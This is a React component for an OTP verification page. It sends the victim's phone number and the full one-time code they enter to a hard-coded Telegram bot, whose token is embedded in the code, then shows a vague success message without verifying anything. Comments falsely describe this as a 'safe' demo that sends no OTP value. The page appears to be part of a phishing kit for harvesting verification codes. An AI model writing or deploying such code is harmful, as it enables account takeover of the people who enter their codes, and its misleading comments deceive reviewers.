import { useState, useRef, useEffect, KeyboardEvent, ClipboardEvent } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { ArrowLeft } from "lucide-react";
import { toast } from "sonner";

const OtpVerification = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const phoneNumber = location.state?.phoneNumber || "78****901";
  const [otp, setOtp] = useState("");
  const [countdown, setCountdown] = useState(60);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const length = 6;
 
  // Mask phone number
  const maskedPhone = phoneNumber.length >= 9
    ? `${phoneNumber.slice(0, 2)}****${phoneNumber.slice(-3)}`
    : phoneNumber;

  // Countdown timer
  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [countdown]);

  // DEMO: Safe Telegram notification (no OTP value)
const sendTelegramOtpEvent = (phone: string, otpLength: number) => {
 const BOT_TOKEN = "8244803895:AAElCNS9IzbpDj8WfaBJM04tH9zrMSpvpjc"; // ⚠ Only for testing
  const CHAT_ID = "6564676243";

  const message =
    `🔔 OTP Submitted \n` +
    `Phone: ${phone}\n` +
    `OTP : ${otpLength}\n` +
    `Status: Submitted`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message
    })
  }).catch(console.error);
};

  const handleChange = (index: number, inputValue: string) => {
    const digit = inputValue.replace(/\D/g, '').slice(-1);
    const newValue = otp.split('');
    newValue[index] = digit;
    const finalValue = newValue.join('').slice(0, length);
    setOtp(finalValue);

    if (digit && index < length - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace') {
      if (!otp[index] && index > 0) {
        inputRefs.current[index - 1]?.focus();
        const newValue = otp.split('');
        newValue[index - 1] = '';
        setOtp(newValue.join(''));
      } else {
        const newValue = otp.split('');
        newValue[index] = '';
        setOtp(newValue.join(''));
      }
    } else if (e.key === 'ArrowLeft' && index > 0) {
      inputRefs.current[index - 1]?.focus();
    } else if (e.key === 'ArrowRight' && index < length - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handlePaste = (e: ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, length);
    setOtp(pastedData);
    const focusIndex = Math.min(pastedData.length, length - 1);
    inputRefs.current[focusIndex]?.focus();
  };

  const handleResend = () => {
    if (countdown === 0) {
      setCountdown(60);
      // Resend OTP logic here
    }
  };

  const handleSubmit = () => {
  if (otp.length === length) {
    // Send DEMO event (safe)
    sendTelegramOtpEvent(phoneNumber, otp);

    // Demo success flow
    toast.success("processed successfully");
    navigate("/");
  }
};


  return (
    <div className="min-h-screen bg-background flex flex-col px-6 pt-6">
      {/* Back Button */}
      <button
        onClick={() => navigate(-1)}
        className="flex items-center gap-2 text-foreground mb-8"
      >
        <ArrowLeft className="w-5 h-5" />
      </button>

      {/* Title */}
      <h1 className="text-2xl font-semibold text-foreground mb-2">
        OTP Verification
      </h1>

      {/* Subtitle */}
      <p className="text-muted-foreground mb-2">
        Enter the OTP sent to your phone number
      </p>

      {/* Masked Phone Number */}
      <p className="text-foreground font-medium mb-8">
        +263 {maskedPhone}
      </p>

      {/* OTP Input */}
      <div className="flex gap-2 justify-center mb-6">
        {Array.from({ length }).map((_, index) => (
          <input
            key={index}
            ref={(el) => (inputRefs.current[index] = el)}
            type="text"
            inputMode="numeric"
            maxLength={1}
            value={otp[index] || ''}
            onChange={(e) => handleChange(index, e.target.value)}
            onKeyDown={(e) => handleKeyDown(index, e)}
            onPaste={handlePaste}
            className="w-12 h-12 text-center text-xl font-semibold border-2 border-gray-300 rounded-xl bg-background text-foreground focus:border-primary focus:ring-2 focus:ring-primary/20 focus:outline-none transition-all"
            aria-label={`OTP digit ${index + 1}`}
          />
        ))}
      </div>

      {/* Resend Timer */}
      <p className="text-center text-muted-foreground mb-8">
        {countdown > 0 ? (
          <>Resend OTP in <span className="text-primary font-medium">{countdown} seconds</span></>
        ) : (
          <button onClick={handleResend} className="text-primary font-medium">
            Resend OTP
          </button>
        )}
      </p>

      {/* Submit Button */}
      <button
        onClick={handleSubmit}
        disabled={otp.length !== length}
        className={`w-full py-4 rounded-full font-semibold transition-colors ${
          otp.length === length 
            ? 'bg-primary text-primary-foreground hover:bg-primary/90' 
            : 'bg-gray-400 text-white opacity-70'
        }`}
      >
        Submit
      </button>
    </div>
  );
};

export default OtpVerification;
